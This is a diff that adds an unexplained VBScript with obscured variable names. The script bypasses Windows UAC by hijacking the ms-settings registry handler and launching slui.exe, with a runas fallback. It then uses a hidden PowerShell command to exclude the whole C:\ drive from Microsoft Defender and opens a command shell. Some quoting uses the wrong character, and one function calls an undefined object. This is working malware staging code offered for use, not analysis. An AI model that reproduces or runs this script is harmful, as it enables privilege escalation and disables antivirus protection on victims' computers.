@@ -1,0 +1,87 @@
+Dim IMG, psd, SADIS, ADO, wn
+Dim SelfFolderPath, UserName, Self
+Set IMG = CreateObject("Scripting.FileSystemObject")
+Set psd = CreateObject("Wscript.Shell")
+Set SADIS = CreateObject("Shell.Application")
+
+Call ScreenDEL(1, False)
+
+SelfFolderPath = FormatPath(IMG.GetFile(WScript.ScriptFullName).ParentFolder.Path)
+
+psd.Run "powershell -windowstyle hidden -command Add-MpPreference -ExclusionPath C:\"
+
+Wscript.Sleep 8000
+
+psd.Run "cmd.exe"
+
+
+
+
+Function ScreenDEL(ByVal Host, ByVal Hide)
+    On Error Resume Next: Err.Clear
+    Dim HostName, Args, i, Argv, TFPath, HAVIG
+    If Host = 1 Then HostName = "wscript.exe"
+    If Host = 2 Then HostName = "cscript.exe"
+    Set Argv = WScript.Arguments
+    For Each Arg in Argv
+        Args = Args & " " & Chr(60) & Arg & Chr(60)
+    Next
+    TFPath = IMG.GetSpecialFolder(WindowsFolder) & "\system32\Tester"
+    IMG.CreateTextFile TFPath, True
+    HAVIG = IMG.FileExists(TFPath) And Err.number <> 70
+    If HAVIG Then IMG.DeleteFile TFPath, True
+    If Not HAVIG Then
+        psd.RegWrite "HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\Command\DelegateExecute", "", "REG_SZ"
+        psd.RegWrite "HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\Command\", "wscript.exe " & Chr(60) & WScript.ScriptFullName & chr(60) & " uac" & Args, "REG_SZ"
+        psd.Run "slui.exe"
+        WScript.Quit
+    ElseIf LCase(Right(WScript.FullName,12)) <> "\" & HostName Then
+        psd.Run HostName & " //e:VBScript """ & WScript.ScriptFullName & """" & Args, Int(Hide)+1, False
+        WScript.Quit
+    Else
+        psd.RegDelete "HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\Command\"
+        psd.RegDelete "HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\"
+        psd.RegDelete "HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\"
+        psd.RegDelete "HKEY_CURRENT_USER\Software\Classes\ms-settings\"
+    End If
+    If Host = 2 Then ExecuteGlobal "Dim SI, SO: Set SI = Wscript.StdIn: Set SO = Wscript.StdOut"
+End Function
+
+Function GetUAC(ByVal Host, ByVal Hide)
+
+    On Error Resume Next: Err.Clear
+    Dim HostName, Args, i, Argv, TFPath, HAVIG
+    If Host = 1 Then HostName = "wscript.exe"
+    If Host = 2 Then HostName = "cscript.exe"
+    Set Argv = WScript.Arguments
+    For Each Arg in Argv
+        Args = Args & " " & Chr(34) & Arg & Chr(34)
+    Next
+    TFPath = IMG.GetSpecialFolder(WindowsFolder) & "\system32\Tester"
+    IMG.CreateTextFile TFPath, True
+    HAVIG = IMG.FileExists(TFPath) And Err.number <> 70
+    If HAVIG Then IMG.DeleteFile TFPath, True
+    If Not HAVIG Then
+        SADIS.ShellExecute "wscript.exe", "//e:VBScript " & Chr(34) & WScript.ScriptFullName & chr(34) & Args, "", "runas", 1
+        WScript.Quit
+    ElseIf LCase(Right(WScript.FullName,12)) <> "\" & HostName Then
+        psd.Run HostName & " //e:VBScript """ & WScript.ScriptFullName & """" & Args, Int(Hide)+1, False
+        WScript.Quit
+    End If
+    If Host = 2 Then ExecuteGlobal "Dim SI, SO: Set SI = Wscript.StdIn: Set SO = Wscript.StdOut"
+End Function
+
+
+Function FormatPath(ByVal Path)
+    If Not Right(Path, 1) = "\" Then
+        Path = Path & "\"
+    End If
+    FormatPath = Path
+End Function
+
+Function CreateTempPath(ByVal IsFolder)
+    Dim TempPath
+    TempPath = FSO.GetSpecialFolder(2) & "\" & FSO.GetTempName()
+    If IsFolder Then TempPath = FormatPath(TempPath)
+    CreateTempPath = TempPath
+End Function
